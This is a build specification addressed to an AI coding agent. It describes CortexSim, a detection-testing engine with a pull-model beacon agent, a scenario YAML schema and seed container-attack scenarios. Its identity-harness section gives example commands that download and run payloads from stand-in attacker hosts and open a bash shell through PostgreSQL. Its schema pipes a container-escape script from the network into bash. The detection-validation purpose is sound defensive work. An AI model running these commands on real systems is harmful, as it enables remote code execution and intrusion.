# CortexSim — Coding Agent Build Context
## Phase 1: Foundation

> **For the Coding Agent:** This document is your complete source of truth for Phase 1. Read every section before writing a single line of code. Architecture decisions are final; implementation details are yours to own. Ask clarifying questions only if a constraint is truly ambiguous.

---

## 1. Project Identity

**Name:** CortexSim  
**Purpose:** Enterprise-grade, Cortex-branded detection simulation engine for Palo Alto Networks Domain Consultants (DCs). Primary POV tooling — replaces ad-hoc scripts with a structured, maintainable, UC/TC-aligned simulation platform.  
**Analogy:** MITRE Caldera's opinionated nephew — not a red team C2, but a *detection quality assurance engine*. The goal is controlled, high-fidelity signal generation that directly validates Cortex detection logic (BIOC, Analytics, IOC, stitching/grouping).  
**Deployment:** Linux jumpbox, single `git clone` + `./install.sh`. No SaaS dependency. No direct Cortex API connection.

---

## 2. Source Repositories (Reference + Integration)

These are treated as **git submodules** under `sources/`. Do NOT write wrapper code around them. The Tool Instantiation Layer (Section 6) builds and runs these as first-class processes/services.

| Submodule Path | Upstream Repo | Language | Role |
|---|---|---|---|
| `sources/signalbench` | `github.com/gocortexio/signalbench` | Rust | MITRE-mapped endpoint telemetry generator — runs alongside real TTPs for double-signal density |
| `sources/gocortexbrokenbank` | `github.com/gocortexio/gocortexbrokenbank` | Python | Intentionally vulnerable CI/CD app — Cloud App Security / ASPM scenarios |
| `sources/mocktaxii` | `github.com/gocortexio/mocktaxii` | Python | Full STIX/TAXII 2.1 server — NDR + TIM demonstration scenarios |
| `sources/gcgit` | `github.com/gocortexio/gcgit` | Rust | XSIAM REST ↔ Git bridge — scenario version management |
| `sources/xdrtop` | `github.com/gocortexio/xdrtop` | Rust | Terminal live monitor — DC-facing activity panel during simulations |
| `sources/ackbarx` | `github.com/gocortexio/ackbarx` | Rust | SNMP trap forwarder to XSIAM HTTP — NDR signal source |
| `sources/CDR` | `github.com/hankthebldr/CDR` | YAML/Shell | Kubernetes CDR scenario baseline — cdr.yml pattern extended here |
| `sources/xsiam-prisma-cdr-lab` | `github.com/hankthebldr/xsiam-prisma-cdr-lab` | Shell | Attack scenario shell library (alpha/1.1 branch) |
| `sources/MITRE-Turla-Carbon` | `github.com/Palo-Cortex/MITRE-Turla-Carbon` | C++ | MITRE-aligned endpoint TTP campaign reference |
| `sources/atomic-red-team` | `github.com/redcanaryco/atomic-red-team` | YAML/Shell | Atomic TTP library — per-technique shell test scripts |

---

## 3. Repository Structure

Build this exact structure. Every directory must have a `README.md` explaining its purpose.

```
cortexsim/
├── AGENT_CONTEXT.md              ← this file (copy here)
├── README.md                     ← DC-facing: what it is, how to deploy
├── install.sh                    ← ONE-LINER BOOTSTRAP (Phase 1 deliverable #1)
├── docker-compose.yml            ← SimCore + dependencies
├── .gitmodules                   ← all sources/ submodule definitions
│
├── core/                         ← SimCore: FastAPI orchestrator (Phase 1 deliverable #2)
│   ├── main.py                   ← FastAPI app entry point
│   ├── config.py                 ← env-based configuration
│   ├── database.py               ← SQLite setup via SQLAlchemy
│   ├── models.py                 ← DB models: Scenario, Run, Result, Tool
│   ├── api/
│   │   ├── scenarios.py          ← GET/POST /scenarios
│   │   ├── runs.py               ← POST /run, GET /runs/{id}
│   │   ├── results.py            ← GET /results
│   │   └── tools.py              ← GET/POST /tools (install/start/stop)
│   ├── engine/
│   │   ├── orchestrator.py       ← routes run requests to pull agent or push generator
│   │   ├── scenario_loader.py    ← reads YAML from scenarios/, validates schema
│   │   └── uctc_mapper.py        ← maps UC/TC refs to scenario metadata
│   ├── planes/
│   │   ├── edr.py
│   │   ├── cdr.py
│   │   ├── ndr.py
│   │   ├── itdr.py
│   │   ├── cloud_app.py
│   │   └── analytics.py
│   ├── tools/
│   │   └── instantiator.py       ← Tool Instantiation Layer (Phase 1 deliverable #3)
│   └── requirements.txt
│
├── agent/                        ← Go beacon agent — pull model (Phase 1 deliverable #6)
│   ├── main.go
│   ├── beacon/
│   │   └── client.go             ← HTTP poll → task fetch → exec → report
│   ├── identity/
│   │   └── harness.go            ← runuser / sudo -u / su execution wrapper
│   ├── executor/
│   │   └── shell.go              ← shell command execution with output capture
│   └── go.mod
│
├── scripts/                      ← Push model output directory
│   ├── linux/                    ← generated bash bundles land here
│   ├── k8s/                      ← generated K8s YAML bundles land here
│   │   └── cdr_base.yml          ← extends hankthebldr/CDR cdr.yml pattern
│   └── windows/                  ← future: PowerShell bundles
│
├── scenarios/                    ← YAML scenario library (UC/TC tagged)
│   ├── _schema.yml               ← scenario schema definition (see Section 5)
│   ├── edr/
│   ├── cdr/
│   │   ├── cdr-001-container-enum.yml
│   │   ├── cdr-002-container-escape.yml
│   │   ├── cdr-003-cryptominer.yml
│   │   ├── cdr-004-k8s-lateral.yml
│   │   └── cdr-005-wildfire-trigger.yml
│   ├── ndr/
│   ├── itdr/
│   ├── cloud_app/
│   └── multi_plane/              ← stitching scenarios spanning 2+ planes
│
├── sources/                      ← git submodules (do not edit source files)
│
├── ui/                           ← React SPA (Phase 1 deliverable #5)
│   ├── src/
│   │   ├── App.jsx
│   │   ├── components/
│   │   │   ├── PlaneSelector.jsx
│   │   │   ├── ScenarioBrowser.jsx
│   │   │   ├── UCTCMapper.jsx
│   │   │   ├── LaunchPanel.jsx
│   │   │   ├── ToolStatusPanel.jsx
│   │   │   └── ResultsViewer.jsx
│   │   ├── styles/
│   │   │   └── cortex-theme.css  ← Cortex design tokens
│   │   └── api/
│   │       └── client.js         ← SimCore API calls
│   ├── package.json
│   └── vite.config.js
│
└── docs/
    ├── uc_tc_mapping/            ← cross-reference to master UC/TC YAML schema
    ├── threat_report_index.md    ← Unit 42 report → scenario mapping
    └── tool_registry.md          ← external tool → TTP → detection plane mapping
```

---

## 4. Phase 1 Deliverables (Exact Spec)

### 4.1 `install.sh` — Jumpbox Bootstrap

**Target OS:** Ubuntu 22.04 LTS (minimum), Debian 12 supported  
**Invocation:** `curl -sSL https://raw.githubusercontent.com/<org>/cortexsim/main/install.sh | bash`  
**Also works:** `git clone <repo> && cd cortexsim && ./install.sh`

**Must do, in order:**
1. Check OS compatibility (exit with clear error if not Linux)
2. Install system dependencies: `git`, `curl`, `docker`, `docker-compose`, `go` (1.21+), `rust`/`cargo`, `python3`, `pip`, `node` (18+), `npm`
3. `git submodule update --init --recursive` — pull all sources
4. Build Go agent: `cd agent && go build -o ../bin/cortexsim-agent ./... && cd ..`
5. Build Rust tools from submodules (signalbench, ackbarx, xdrtop): `cargo build --release` in each
6. Install Python deps for mocktaxii and gocortexbrokenbank from their submodule dirs
7. Build React UI: `cd ui && npm install && npm run build && cd ..`
8. Copy UI build output to `core/static/`
9. `docker-compose up -d` — start SimCore
10. Print success banner with: SimCore URL, default creds, quick start commands

**Must NOT:**
- Require root for the entire script (use `sudo` only for docker group and apt installs)
- Fail silently — every step must have explicit error handling with clear messages
- Overwrite existing configs on re-run (idempotent)

---

### 4.2 SimCore — FastAPI Application

**Stack:** Python 3.11+, FastAPI, SQLAlchemy (SQLite), Pydantic v2, Uvicorn  
**Port:** 8888 (configurable via `CORTEXSIM_PORT` env var)  
**Static files:** Serves React UI build from `core/static/` at root `/`

**API Endpoints — Phase 1 minimum:**

```
GET  /api/health                    → {"status": "ok", "version": "1.0.0"}
GET  /api/scenarios                 → list all scenarios with UC/TC metadata
GET  /api/scenarios/{id}            → single scenario detail
GET  /api/scenarios?plane=cdr       → filter by detection plane
GET  /api/scenarios?uc_ref=UCS-CDR-03 → filter by UC reference

POST /api/run                       → launch scenario (pull or push mode)
     body: {scenario_id, mode: "pull"|"push", target_agent_id?, identity?}
GET  /api/runs                      → list all runs
GET  /api/runs/{run_id}             → run detail + status

GET  /api/results                   → all detection results
GET  /api/results/{run_id}          → results for a specific run

GET  /api/tools                     → list all instantiatable tools + status
POST /api/tools/{tool_name}/install → build tool from submodule
POST /api/tools/{tool_name}/start   → start tool as managed process
POST /api/tools/{tool_name}/stop    → stop tool
GET  /api/tools/{tool_name}/status  → health check

GET  /api/agents                    → list connected pull agents
```

**Database Models (SQLite):**
```python
# Scenario: loaded from YAML, not user-created
id, scenario_id, name, plane, uc_ref, tc_ref, mitre_tactic, 
mitre_technique, execution_identity, push_supported, pull_supported,
external_tools (JSON array), threat_report_ref, created_at

# Run: execution record
id, scenario_id, mode (pull/push), target, identity_context,
status (pending/running/complete/failed), started_at, completed_at

# Result: detection outcome per run
id, run_id, plane, tool_used, signal_type (BIOC/IOC/Analytics),
expected_detection, observed (bool), notes, timestamp

# ToolInstance: managed tool state
id, tool_name, install_path, pid, status (not_installed/installed/running/stopped),
port (if applicable), last_health_check
```

---

### 4.3 Tool Instantiation Layer

**File:** `core/tools/instantiator.py`  
**Concept:** Think of this as a mini `systemd` or `pm2` for security tools. It manages the lifecycle of published tools from their submodule source — building them once, running them as subprocess or background process, health-checking them.

**Key design principle:** NO WRAPPER CODE. The instantiator calls `signalbench` binary with its native CLI flags. It calls `mocktaxii` with its native arguments. SimCore is the *manager*, not a translation layer.

**Tool Registry** (`core/tools/registry.py`) — statically define each tool:

```python
TOOL_REGISTRY = {
    "signalbench": {
        "source_path": "sources/signalbench",
        "build_cmd": "cargo build --release",
        "binary": "sources/signalbench/target/release/signalbench",
        "run_template": "{binary} --technique {mitre_id} --count {count} --output json",
        "type": "binary",          # binary | service | k8s
        "plane": ["edr"],
        "description": "MITRE-mapped endpoint telemetry generator"
    },
    "mocktaxii": {
        "source_path": "sources/mocktaxii",
        "build_cmd": "pip install -r requirements.txt",
        "run_template": "python3 {source_path}/main.py --port {port}",
        "type": "service",
        "port": 9000,
        "plane": ["ndr"],
        "health_check": "http://localhost:9000/taxii/",
        "description": "STIX/TAXII 2.1 server for TIM scenarios"
    },
    "gocortexbrokenbank": {
        "source_path": "sources/gocortexbrokenbank",
        "build_cmd": "pip install -r requirements.txt",
        "run_template": "python3 {source_path}/app.py --port {port}",
        "type": "service",
        "port": 9001,
        "plane": ["cloud_app"],
        "health_check": "http://localhost:9001/health",
        "description": "Intentionally vulnerable app for CI/CD and ASPM scenarios"
    },
    "ackbarx": {
        "source_path": "sources/ackbarx",
        "build_cmd": "cargo build --release",
        "binary": "sources/ackbarx/target/release/ackbarx",
        "run_template": "{binary} --listen-port 162 --forward-url {xsiam_endpoint}",
        "type": "service",
        "plane": ["ndr"],
        "description": "SNMP trap forwarder to XSIAM HTTP endpoints"
    },
    "xdrtop": {
        "source_path": "sources/xdrtop",
        "build_cmd": "cargo build --release",
        "binary": "sources/xdrtop/target/release/xdrtop",
        "run_template": "{binary}",
        "type": "binary",
        "plane": ["all"],
        "description": "Terminal-based live XSIAM/XDR monitor"
    }
}
```

**InstantiatorService class must implement:**
```python
class ToolInstantiator:
    def install(self, tool_name: str) -> InstallResult
    def start(self, tool_name: str, params: dict) -> StartResult  
    def stop(self, tool_name: str) -> StopResult
    def status(self, tool_name: str) -> ToolStatus
    def health_check(self, tool_name: str) -> bool
    def list_all(self) -> list[ToolStatus]
```

Process management: use Python `subprocess.Popen` for binary tools, store PIDs in DB, use `psutil` for health checks. For services with HTTP health checks, use `httpx` async client.

---

### 4.4 Push Script Generator

**File:** `core/engine/push_generator.py`  
**Input:** Scenario YAML  
**Output:** Self-contained bash script (Linux) or K8s YAML manifest

**Bash bundle must include:**
1. Header comment block: scenario ID, UC/TC refs, MITRE techniques, expected detections
2. Identity harness setup (see Section 7)  
3. Dependency checks (required tools available?)
4. Ordered TTP execution steps from scenario YAML
5. Cleanup/teardown section
6. Execution log to `/tmp/cortexsim-{scenario_id}-{timestamp}.log`

**K8s YAML bundle:**  
Extends `cdr_base.yml` pattern from `sources/CDR/cdr.yml`. Each container in the manifest corresponds to one scenario phase. Simulation begins automatically on `kubectl apply`.

**API endpoint:**
```
GET /api/scenarios/{id}/download?format=bash    → download bash bundle
GET /api/scenarios/{id}/download?format=k8s     → download K8s YAML
```

---

### 4.5 Cortex-Branded React UI

**Stack:** React 18, Vite, plain CSS (no Tailwind — avoids build complexity)  
**Served by:** SimCore's FastAPI static file mount at `/`

**Cortex Design Tokens:**
```css
:root {
  --cortex-navy: #003366;
  --cortex-teal: #00C0E8;
  --cortex-steel: #6B7E8E;
  --cortex-white: #FFFFFF;
  --cortex-light-bg: #F4F6F8;
  --cortex-border: #D1D8DE;
  --cortex-success: #00B894;
  --cortex-warning: #F39C12;
  --cortex-danger: #E74C3C;
  --font-primary: 'Inter', -apple-system, sans-serif;
  --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
}
```

**Layout — three-column:**
```
┌──────────────┬──────────────────────────┬──────────────────┐
│ LEFT RAIL    │ MAIN PANEL               │ RIGHT RAIL       │
│              │                          │                  │
│ Detection    │ Scenario Browser         │ Tool Status      │
│ Plane        │ (UC/TC filtered)         │ Panel            │
│ Selector     │                          │                  │
│              │ Selected Scenario        │ signalbench: ●   │
│ ○ EDR        │ Detail Card              │ mocktaxii: ●     │
│ ● CDR        │                          │ brokenbank: ○    │
│ ○ NDR        │ ┌─ Launch Panel ───────┐ │ ackbarx: ○       │
│ ○ ITDR       │ │ Mode: Pull | Push    │ │                  │
│ ○ Cloud App  │ │ Identity: [dropdown] │ │ xdrtop: ○        │
│ ○ Analytics  │ │ [▶ Launch] [↓ Download]│ │ [Install All]  │
│              │ └──────────────────────┘ │                  │
└──────────────┴──────────────────────────┴──────────────────┘
```

**Component specs:**

`PlaneSelector` — 6 clickable cards with icons, highlights active plane, shows scenario count per plane.

`ScenarioBrowser` — filterable table: Scenario Name | MITRE Tactic | UC Ref | TC Ref | Plane tags | Push/Pull badges. Click row → expand detail card.

`UCTCMapper` — shows the full UC/TC chain for selected scenario. Pulls from `/api/scenarios/{id}`. Displays: UC name + description → TC steps → expected detections per step.

`LaunchPanel` — Mode toggle (Pull/Push). Identity dropdown (populated from scenario YAML `execution_identity` options). For Pull: agent selector dropdown. For Push: format selector (bash/k8s) + download button. Launch button calls `POST /api/run`.

`ToolStatusPanel` — real-time tool list (poll `/api/tools` every 5s). Green dot = running, red = stopped, grey = not installed. Per-tool: Install / Start / Stop buttons. "Install All" master button.

`ResultsViewer` — run history table. Click run → show expected vs observed detections per plane. Coverage percentage bar per detection type (BIOC/IOC/Analytics).

**Header:** Cortex logo SVG (navy background, teal accent), "CortexSim" title, version badge, jumpbox hostname.

---

### 4.6 Go Beacon Agent — Pull Model

**File:** `agent/main.go`  
**Build output:** `bin/cortexsim-agent`  
**Invocation:** `./bin/cortexsim-agent --server http://localhost:8888 --id <agent-id> --interval 10`

**Behavior:**
1. On start: `POST /api/agents/register` with hostname, OS, capabilities
2. Poll loop (configurable interval, default 10s): `GET /api/agents/{id}/tasks`
3. If task returned: execute via Identity Harness → stream output back → `POST /api/runs/{run_id}/output`
4. On completion: `POST /api/runs/{run_id}/complete` with exit code + summary

**Identity Harness** (`agent/identity/harness.go`):
```go
type ExecutionIdentity struct {
    Mode     string // "direct" | "runuser" | "sudo_u" | "su"
    Username string // e.g. "www-data", "postgres", "node", "nobody"
    Command  string // the TTP command to execute
}

func Execute(identity ExecutionIdentity) (ExecResult, error)
```

Maps to real execution patterns:
- `runuser`: `runuser -l www-data -c "command"`
- `sudo_u`: `sudo -u postgres command`
- `su`: `su -s /bin/bash -c "command" nobody`

This creates realistic process causality chains in XDR/XSIAM — the parent PID traces to a legitimate service account, exactly how APT lateral movement appears.

---

## 5. Scenario YAML Schema

Every scenario file must conform to this schema. The scenario loader validates on startup and rejects malformed files.

```yaml
# scenarios/_schema.yml — reference

scenario_id: SIM-CDR-001          # SIM-{PLANE}-{NNN}
name: "Container Enumeration via DEEPCE"
version: "1.0"
status: "active"                   # active | draft | deprecated

# Detection plane targeting
plane: CDR                         # EDR | CDR | NDR | ITDR | CLOUD_APP | ANALYTICS
detection_types:                   # what Cortex engines should fire
  - BIOC
  - Analytics

# UC/TC alignment (maps to master YAML schema library)
uc_ref: UCS-CDR-03
tc_ref: TC-CDR-09
uc_name: "Container Runtime Threat Detection"
tc_name: "Container Escape Enumeration"

# MITRE mapping
mitre_tactic: "TA0007"
mitre_tactic_name: "Discovery"
mitre_technique: "T1613"
mitre_technique_name: "Container and Resource Discovery"

# Threat intelligence linkage
threat_report: "Unit42 - Large-Scale Monero Cryptomining Operation"
threat_report_url: "https://unit42.paloaltonetworks.com/unit42-large-scale-monero-cryptocurrency-mining-operation-using-xmrig/"

# Execution configuration
execution_identity:
  default: "container-runtime"
  options:
    - container-runtime
    - root
    - www-data
push_supported: true
pull_supported: true

# External tools required (must be in TOOL_REGISTRY)
external_tools:
  - name: deepce
    source: "https://github.com/stealthcopter/deepce"
    type: "script"                 # script | binary | service
    install_inline: true           # download at runtime vs pre-installed
    
# Execution steps
steps:
  - id: step-01
    name: "Install enumeration dependencies"
    command: "apk add --no-cache curl wget"
    identity: container-runtime
    mitre_technique: "T1059.004"
    expected_detections:
      - plane: CDR
        type: Analytics
        description: "Package manager execution in container — unusual install pattern"
    
  - id: step-02
    name: "Download and execute DEEPCE container escape tool"
    command: "curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | bash"
    identity: container-runtime
    mitre_technique: "T1613"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Container enumeration script execution — DEEPCE signature"
      - plane: Analytics
        type: Analytics
        description: "Suspicious curl-pipe-bash pattern in container context"

  - id: step-03
    name: "Check for privileged container escape vectors"
    command: "ls -la /dev && cat /proc/1/status && mount | grep docker"
    identity: container-runtime
    mitre_technique: "T1611"
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Container escape attempt — privileged mode enumeration"

# Cleanup
cleanup:
  commands:
    - "rm -f /tmp/deepce.sh /tmp/enum_output.txt"
  k8s_teardown: "kubectl delete -f {manifest_path}"

# Metadata
author: "Henry Reed"
created: "2026-04-12"
last_updated: "2026-04-12"
tags:
  - container-security
  - enumeration
  - cloud-native
```

---

## 6. Detection Planes Reference

| Plane | Cortex Engine | Key Detection Types | Primary Source Repos |
|---|---|---|---|
| **EDR** | Cortex XDR Agent | BIOC (process/memory/persistence), IOC (hash/IP/domain), Behavioral Analytics | signalbench, atomic-red-team, MITRE-Turla-Carbon |
| **CDR** | Cortex Cloud / Prisma Cloud Compute | Runtime BIOC, Container Analytics, K8s Anomaly | hankthebldr/CDR, xsiam-prisma-cdr-lab, DEEPCE, XMRig |
| **NDR** | Network Security / Firewall Analytics | C2 traffic, lateral movement, protocol anomaly | ackbarx (SNMP), mocktaxii (STIX), Responder |
| **ITDR** | Cortex ITDR | Kerberoast, Pass-the-Hash, DCSync, MFA bypass | Impacket, identity harness (runuser/sudo-u) |
| **Cloud App** | Cortex Cloud App Security | Shadow IT, OAuth abuse, CI/CD pipeline attacks | gocortexbrokenbank |
| **Analytics** | XSIAM Correlation Engine | Multi-source stitch, behavioral baseline deviation | All planes — analytics scenarios span 2+ planes |

---

## 7. Identity / Causality Graph Strategy

**Why this matters:** XSIAM's causality graph traces process lineage. Real APT activity runs from legitimate process contexts. CortexSim replicates this by wrapping every TTP in an identity harness — the attack appears to originate from `www-data`, `postgres`, `node`, or another service account.

**Harness invocation pattern:**
```bash
# runuser model (cleanest causality — su to service account)
runuser -l www-data -c "curl -sSL http://attacker.com/shell.sh | bash"

# sudo -u model (common for container-adjacent processes)
sudo -u postgres psql -c "COPY (SELECT '') TO PROGRAM 'bash -i'"

# su model (fallback for systems without sudo)
su -s /bin/bash nobody -c "wget http://c2.attacker.com/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p"
```

**Service account taxonomy for scenarios:**
- `www-data` — web server lateral movement (EDR, CDR)
- `postgres` / `mysql` — database abuse (EDR, ITDR)
- `node` / `python3` — application-layer TTPs (CDR, Cloud App)
- `nobody` — minimal-privilege escape attempts (CDR)
- `container-runtime` — K8s/Docker context (CDR)
- `svc-backup` — persistence via backup service (EDR, ITDR)

---

## 8. The 5 Seed CDR Scenarios (Phase 1)

Build these as YAML files, drawing execution logic from `sources/CDR/cdr.yml` and `sources/xsiam-prisma-cdr-lab/1.1/attack_scenarios/`:

| ID | Name | Key TTPs | Tools Used | UC Ref |
|---|---|---|---|---|
| SIM-CDR-001 | Container Enumeration | T1613, T1082 | DEEPCE, LinPEAS | UCS-CDR-01 |
| SIM-CDR-002 | Cryptominer Deployment | T1496, T1105 | XMRig (Unit42 variant) | UCS-CDR-02 |
| SIM-CDR-003 | Container Escape via Privileged Mode | T1611, T1610 | DEEPCE, nsenter | UCS-CDR-03 |
| SIM-CDR-004 | K8s Lateral Movement + Persistence | T1021.001, T1053.005 | kubectl abuse, cron | UCS-CDR-04 |
| SIM-CDR-005 | WildFire Malware Trigger | T1105, T1486 | WildFire test files, simulated backdoor | UCS-CDR-05 |

Each scenario must use the full YAML schema from Section 5.

---

## 9. Docker Compose Spec

```yaml
# docker-compose.yml
version: '3.8'

services:
  simcore:
    build: ./core
    ports:
      - "${CORTEXSIM_PORT:-8888}:8888"
    volumes:
      - ./scenarios:/app/scenarios:ro
      - ./sources:/app/sources:ro
      - ./scripts:/app/scripts
      - simcore_db:/app/data
      - /var/run/docker.sock:/var/run/docker.sock  # for tool process management
    environment:
      - CORTEXSIM_ENV=${CORTEXSIM_ENV:-production}
      - CORTEXSIM_SECRET=${CORTEXSIM_SECRET:-changeme}
    restart: unless-stopped

volumes:
  simcore_db:
```

`core/Dockerfile`:
```dockerfile
FROM python:3.11-slim
WORKDIR /app
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl git cargo rustc golang-go nodejs npm && rm -rf /var/lib/apt/lists/*
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8888", "--workers", "2"]
```

---

## 10. Technical Constraints & Non-Negotiables

1. **No Cortex API connection.** SimCore is standalone. It generates signals INTO the customer's Cortex environment via agent-based execution — it does not read alerts OUT of Cortex.

2. **No wrappers around external tools.** The Tool Instantiation Layer calls their real published binaries/scripts with native CLI arguments. SimCore is the process manager, not a translation layer.

3. **Idempotent install.** Running `install.sh` twice on an already-configured system must be safe. Check-before-act on every step.

4. **YAML schema validation on load.** The scenario loader must validate against `_schema.yml` using Pydantic. Reject invalid files with clear error messages, don't silently skip them.

5. **Identity harness is required for every step.** Even if `identity: root` is specified — it must still go through the harness wrapper for logging and consistency.

6. **Cortex branding.** The UI must look like an official Palo Alto Networks tool. Use the exact color tokens from Section 4.5. The header must include the Cortex icon (use the SVG from PANW's public press kit or approximate it with navy/teal geometric shapes).

7. **Push mode must be self-contained.** A downloaded bash bundle must execute correctly on a clean Ubuntu 22.04 box with only the agent installed — no SimCore dependency at runtime.

8. **All API endpoints must return structured JSON.** Even errors: `{"error": "...", "code": "...", "detail": "..."}`.

9. **Log everything.** Every TTP execution step, every tool lifecycle event, every API call to `/api/run` must write to `logs/cortexsim.log` with timestamp, level, scenario_id, run_id.

---

## 11. Phase 2 Preview (Do Not Build Now — Context Only)

- All 6 detection plane modules with complete scenario libraries
- signalbench double-signal density integration (run signalbench alongside real TTPs for same MITRE technique)
- External tool registry expansion: Impacket, Responder, Mimikatz (Linux), BloodHound
- Multi-target topology engine (define network graph, engine plans kill chain path)
- Alert stitch group validation reports (expected grouping vs observed in Cortex)
- Cloud deployment templates: Terraform for AWS/GCP jumpbox provisioning
- Scenario versioning with Unit 42 threat report tag system
- gcgit integration for pushing scenarios as XSIAM correlation rules

---

## 12. Questions the Coding Agent Should NOT Ask

These are decided. Build to spec:

- **Repo hosting:** Under `hankthebldr` GitHub initially, PR to `Palo-Cortex` org when stable
- **UI architecture:** SPA served directly by SimCore's FastAPI static mount — not a separate deployment
- **Auth:** Phase 1 has no auth (jumpbox is assumed to be access-controlled). Phase 2 adds API key auth.
- **Database:** SQLite only for Phase 1. No PostgreSQL, no Redis, no external dependencies beyond docker.
- **Agent protocol:** HTTP polling (not WebSocket, not gRPC) — simplest for DC environments with restrictive firewall rules
- **Scenario source of truth:** YAML files in `scenarios/` — not database. DB is for run history only.

---

*Document version: 1.0 | Created: 2026-04-12 | Owner: Henry Reed, DC2 GTM NAM Cortex*  
*Next update: After Phase 1 complete — add Phase 2 agent context*
